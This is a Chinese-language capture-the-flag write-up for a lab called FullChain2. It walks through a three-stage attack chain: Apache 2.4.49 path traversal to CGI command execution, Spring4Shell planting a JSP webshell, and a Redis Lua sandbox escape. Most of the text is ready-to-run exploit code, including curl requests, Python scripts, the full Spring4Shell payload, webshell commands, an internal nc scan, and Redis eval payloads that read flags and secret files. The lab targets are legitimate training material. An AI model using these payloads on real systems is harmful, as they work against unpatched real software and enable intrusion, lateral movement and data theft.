# FullChain2 完整攻击链题解

🚨 **警告**: 本题解仅用于验证环境可行性和教育目的，请勿用于未授权的攻击活动。
攻击链总结：前两步都可以构建webshell直接达到rce,也可以配置反向代理等，第三个内网需要穿透两次,或者在第二个配置下做反向代理实现直接渗透

## 🎯 攻击链概览

```
外网 → Apache HTTP Server 2.4.49 路径穿越漏洞 → Spring RCE → Redis RCE → 完全控制
     (CVE-2021-41773)                                (CVE-2022-22965) (CVE-2022-0543)
```

---

## 📝 第一阶段：Apache HTTP Server 2.4.49 路径穿越漏洞 (CVE-2021-41773)

### 目标信息
- **服务**: Apache HTTP Server 2.4.49
- **漏洞**: CVE-2021-41773 (路径穿越)
- **入口**: `http://localhost:8080`
- **类型**: 无需认证的路径穿越，若开启`cgi/cgid`模块可导致RCE

### 1.1 初始侦察

```bash
# 确认目标服务
curl -I http://localhost:8080

# 访问Apache默认页面
curl http://localhost:8080
```

### 1.2 漏洞分析

Apache HTTP Server 2.4.49版本中存在一个路径穿越漏洞。如果Web目录配置不当（例如允许访问`/icons/`等目录），攻击者可以通过`/.%2e/`序列访问Web目录以外的文件。在开启了`cgi`或`cgid`模块的服务器上，该漏洞可被进一步利用，通过路径穿越执行任意命令。

### 1.3 第一步：文件读取验证

```bash
# 验证LFI漏洞存在，尝试读取 /etc/passwd
curl -v --path-as-is http://localhost:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### 1.4 第二步：获取第一个Flag

根据`docker-compose.yml`的配置，第一个flag文件`flag1_apache.txt`被挂载到了Apache容器的`/tmp/flag1.txt`。

```bash
# 读取第一个flag
curl -v --path-as-is http://localhost:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/tmp/flag1.txt
```

### 1.5 第三步：通过CGI/CGID模块进行命令执行 (为第二阶段做准备)

如果Apache服务器开启了`cgi`或`cgid`模块，并且`cgi-bin`目录可访问，攻击者可以通过路径穿越执行任意命令。此步骤是连接到第二阶段Spring攻击的关键。

```bash
# 执行命令 `id`
curl -v --data "echo;id" 'http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'

# 例如，测试网络连接到Spring服务 (172.23.0.10)
curl -v --data "echo;ping -c 1 172.23.0.10" 'http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

**预期结果**: `flag{apache_to_rce_easy_black_box_3xpl01t} `

使用bp轻松过
---

## 📝 第二阶段：Spring CVE-2022-22965 攻击

### 目标信息
- **服务**: Spring WebMVC 5.3.17
- **漏洞**: CVE-2022-22965 (Spring4Shell)
- **位置**: DMZ网络 `172.23.0.10:8080`
- **类型**: 数据绑定RCE

### 2.1 网络发现

首先通过已控制的Apache服务器进行网络探测，确认Spring服务存在。在真实场景中，我们会使用专业的网络扫描工具如Nmap。

# 方案二：直接扫描指定IP的8080端口 (如果已知目标IP，例如 172.23.0.10)

```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: localhost:10000' -H $'Cache-Control: max-age=0' -H $'sec-ch-ua: \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"' -H $'sec-ch-ua-mobile: ?0' -H $'sec-ch-ua-platform: \"Linux\"' -H $'Accept-Language: en-US,en;q=0.9' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Accept-Encoding: gzip, deflate, br' -H $'If-None-Match: \"2d-432a5e4a73a80\"' -H $'If-Modified-Since: Mon, 11 Jun 2007 18:53:14 GMT' -H $'Content-Length: 27' \
    --data-binary $'echo;nmap -sn 172.23.0.0/24' \
    $'http://localhost:10000/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```


### 2.2 Spring4Shell漏洞分析

CVE-2022-22965利用Spring框架的数据绑定功能，通过特殊的参数名操作Tomcat的访问日志配置，写入JSP webshell。

### 2.3 构造Spring4Shell攻击

通过已控制的Apache容器发起对Spring应用的攻击。我们需要将Spring4Shell的Payload作为命令参数传递给Apache的`/bin/sh`。由于payload中包含大量特殊字符，需要进行适当的URL编码。

```python
# 通过Apache RCE攻击Spring应用 (此脚本在攻击者本机执行)
import requests
import urllib.parse

apache_target = 'http://localhost:8080'
apache_rce_endpoint = f'{apache_target}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'

# Spring4Shell攻击URL构造
spring_target_ip = '172.23.0.10'
params = {
    'class.module.classLoader.resources.context.parent.pipeline.first.pattern': '%{c2}i if(\"j\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i',
    'class.module.classLoader.resources.context.parent.pipeline.first.suffix': '.jsp',
    'class.module.classLoader.resources.context.parent.pipeline.first.directory': 'webapps/ROOT',
    'class.module.classLoader.resources.context.parent.pipeline.first.prefix': 'tomcatwar',
    'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat': '',
    'suffix': '%>//',
    'c1': 'Runtime',
    'c2': '<%'
}

encoded_params = urllib.parse.urlencode(params)
spring_attack_url = f'http://{spring_target_ip}:8080/?{encoded_params}'

# 构造通过Apache RCE执行的curl命令
# 由于payload中的双引号，需要仔细处理转义
curl_command = f'curl -s "{spring_attack_url}"'

# 发送攻击请求
data = f"echo;{curl_command}"
response = requests.post(apache_rce_endpoint, data=data)

print(f"[*] Spring4Shell attack executed via Apache RCE. Target: {spring_attack_url}")
print(f"[*] Apache RCE Response: {response.text}")
```

### 2.4 访问Spring Webshell

通过Apache RCE访问在Spring应用上创建的webshell并执行命令。

```python
# 通过Apache RCE访问Spring webshell执行命令 (此脚本在攻击者本机执行)
import requests
import urllib.parse

apache_target = 'http://localhost:8080'
apache_rce_endpoint = f'{apache_target}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
spring_webshell_url = 'http://172.23.0.10:8080/tomcatwar.jsp?pwd=j&cmd=id'

# 构造通过Apache RCE执行的curl命令
curl_command = f'curl -s "{spring_webshell_url}"'

# 发送请求
data = f"echo;{curl_command}"
response = requests.post(apache_rce_endpoint, data=data)

print("[*] Spring webshell execution result via Apache RCE:")
print(response.text)
```

### 2.5 获取第二个Flag

```python
# 通过Spring webshell读取flag2 (此脚本在攻击者本机执行)
import requests
import urllib.parse

apache_target = 'http://localhost:8080'
apache_rce_endpoint = f'{apache_target}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
spring_webshell_url = 'http://172.23.0.10:8080/tomcatwar.jsp'

# 通过Spring webshell读取flag的命令
flag_read_cmd = 'cat /root/flag2.txt'
encoded_flag_read_cmd = urllib.parse.quote(flag_read_cmd)

# 构造通过Apache RCE执行的curl命令
curl_command = f'curl -s "{spring_webshell_url}?pwd=j&cmd={encoded_flag_read_cmd}"'

# 发送请求
data = f"echo;{curl_command}"
response = requests.post(apache_rce_endpoint, data=data)

print("[*] Flag 2 via Apache RCE -> Spring Webshell:")
print(response.text)
```

**预期结果**: `flag{spring_dmz_compromise_horizontal_movement_5ucce55ful_d4t4_b1nd1ng}`

### 2.6 清理Spring日志模式 (重要)

在利用完成后，为了防止 `tomcatwar.jsp` 文件持续增大，需要将 `class.module.classLoader.resources.context.parent.pipeline.first.pattern` 清空。

```python
# 通过Apache RCE清理Spring日志模式 (此脚本在攻击者本机执行)
import requests
import urllib.parse

apache_target = 'http://localhost:8080'
apache_rce_endpoint = f'{apache_target}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'

# 构造清理日志模式的URL
spring_clear_pattern_url = 'http://172.23.0.10:8080/?class.module.classLoader.resources.context.parent.pipeline.first.pattern='

# 构造通过Apache RCE执行的curl命令
curl_command_clear = f'curl -s "{spring_clear_pattern_url}"'

# 发送清理请求
data_clear = f"echo;{curl_command_clear}"
response_clear = requests.post(apache_rce_endpoint, data=data_clear)

print("[*] Spring日志模式清理完成。Response:")
print(response_clear.text)
```

---

## 📝 第三阶段：Redis CVE-2022-0543 攻击

### 目标信息
- **服务**: Redis 5.0.7
- **漏洞**: CVE-2022-0543 
- **位置**: 内网 `172.24.0.10:6379`
- **类型**: Lua沙箱逃逸RCE

### 3.1 发现Redis服务

```python
# 通过Spring webshell扫描内网Redis服务 (此脚本在攻击者本机执行)
import requests
import urllib.parse

apache_target = 'http://localhost:8080'
apache_rce_endpoint = f'{apache_target}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
spring_webshell_url = 'http://172.23.0.10:8080/tomcatwar.jsp'

print("[*] 正在通过Spring webshell扫描内网Redis服务...")
redis_found = False
for i in range(1, 20):
    ip = f'172.24.0.{i}'
    
    # 构造通过Spring webshell扫描Redis的命令
    webshell_cmd = f'timeout 5 bash -c "echo quit | nc {ip} 6379"'
    encoded_webshell_cmd = urllib.parse.quote(webshell_cmd)

    # 构造通过Apache RCE执行的curl命令
    curl_command = f'curl -s "{spring_webshell_url}?pwd=j&cmd={encoded_webshell_cmd}"'
    data = f"echo;{curl_command}"
    response = requests.post(apache_rce_endpoint, data=data)

    if 'redis' in response.text.lower() or 'version' in response.text.lower() or '+pong' in response.text.lower():
        print(f'Found Redis at {ip}:6379')
        redis_found = True
        break
if not redis_found:
    print("[!] 未找到Redis服务或扫描超时。")
```

### 3.2 Redis Lua沙箱逃逸分析

CVE-2022-0543允许在Debian/Ubuntu系统上通过`package.loadlib`函数逃逸Lua沙箱，加载系统库执行任意命令。

### 3.3 构造Redis攻击

```python
# 通过Spring webshell连接Redis并执行Lua RCE (此脚本在攻击者本机执行)
import requests
import urllib.parse

apache_target = 'http://localhost:8080'
apache_rce_endpoint = f'{apache_target}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
spring_webshell_url = 'http://172.23.0.10:8080/tomcatwar.jsp'
redis_target_ip = '172.24.0.10'

# Redis Lua沙箱逃逸payload
redis_command_id = '''eval "local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); local io = io_l(); local f = io.popen('id', 'r'); local res = f:read('*a'); f:close(); return res" 0'''

# 通过Spring webshell执行redis命令
webshell_cmd_id = f'echo "{redis_command_id}" | nc {redis_target_ip} 6379'
encoded_webshell_cmd_id = urllib.parse.quote(webshell_cmd_id)

# 构造通过Apache RCE执行的curl命令
curl_command_id = f'curl -s "{spring_webshell_url}?pwd=j&cmd={encoded_webshell_cmd_id}"'
data_id = f"echo;{curl_command_id}"
response_id = requests.post(apache_rce_endpoint, data=data_id)

print('Redis RCE test via Apache -> Spring -> Redis:')
print(response_id.text)
```

### 3.4 获取最终Flag

```python
# 读取第三个flag (此脚本在攻击者本机执行)
import requests
import urllib.parse

apache_target = 'http://localhost:8080'
apache_rce_endpoint = f'{apache_target}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
spring_webshell_url = 'http://172.23.0.10:8080/tomcatwar.jsp'
redis_target_ip = '172.24.0.10'

redis_command_flag3 = '''eval "local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); local io = io_l(); local f = io.popen('cat /root/flag3_final.txt', 'r'); local res = f:read('*a'); f:close(); return res" 0'''
webshell_cmd_flag3 = f'echo "{redis_command_flag3}" | nc {redis_target_ip} 6379'
encoded_webshell_cmd_flag3 = urllib.parse.quote(webshell_cmd_flag3)

# 构造通过Apache RCE执行的curl命令
curl_command_flag3 = f'curl -s "{spring_webshell_url}?pwd=j&cmd={encoded_webshell_cmd_flag3}"'
data_flag3 = f"echo;{curl_command_flag3}"
response_flag3 = requests.post(apache_rce_endpoint, data=data_flag3)

print('Flag 3 via Apache -> Spring -> Redis:')
print(response_flag3.text)

# 读取最终成就文件 (此脚本在攻击者本机执行)
redis_command_final_secret = '''eval "local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); local io = io_l(); local f = io.popen('cat /var/secret/final_secret.txt', 'r'); local res = f:read('*a'); f:close(); return res" 0'''
webshell_cmd_final_secret = f'echo "{redis_command_final_secret}" | nc {redis_target_ip} 6379'
encoded_webshell_cmd_final_secret = urllib.parse.quote(webshell_cmd_final_secret)

# 构造通过Apache RCE执行的curl命令
curl_command_final_secret = f'curl -s "{spring_webshell_url}?pwd=j&cmd={encoded_webshell_cmd_final_secret}"'
data_final_secret = f"echo;{curl_command_final_secret}"
response_final_secret = requests.post(apache_rce_endpoint, data=data_final_secret)

print('Final Secret via Apache -> Spring -> Redis:')
print(response_final_secret.text)
```

**预期结果**: 
- Flag 3: `flag{redis_internal_network_full_compromise_lua_sandbox_escape_f1n4l_t4rg3t}`
- Final Achievement: 完整的祝贺信息和最终成就flag

---

## 🏆 攻击链完成验证

### 成功标志确认

1. ✅ **Apache 路径穿越**: 获得初始立足点
2. ✅ **网络发现**: 发现DMZ网络中的Spring应用
3. ✅ **Spring4Shell**: 成功横向移动到DMZ
4. ✅ **内网发现**: 发现完全隔离的Redis服务
5. ✅ **Redis RCE**: 通过Lua逃逸获得最终控制
6. ✅ **Flag收集**: 获得所有三个flag和最终成就

### 技术要点总结

- **路径穿越**: 深度利用Apache服务器配置漏洞
- **网络隧道**: 通过已控制节点作为跳板
- **数据绑定攻击**: 操作Spring框架内部机制
- **沙箱逃逸**: 绕过Redis Lua安全限制
- **链式攻击**: 每个阶段为下一阶段提供基础

---

🎯 **完整攻击链验证完成！这个题解展示了从外网到内网的完整渗透路径。** 